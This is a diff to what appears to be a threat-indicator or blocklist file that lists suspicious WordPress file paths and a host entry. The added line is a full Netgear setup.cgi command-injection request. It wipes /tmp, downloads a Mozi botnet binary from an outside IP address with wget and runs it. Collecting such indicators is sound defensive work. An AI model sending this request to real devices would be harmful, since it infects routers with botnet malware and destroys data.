@@ -17379,3 +17379,4 @@ pro.ip-api.com:443
 /wp-content/plugins/backup-backup/includes/923924098...php
 /wp-content/uploads/2023/11/system.php
 /wp-includes/class-flitert.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.230.66.53:11342/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
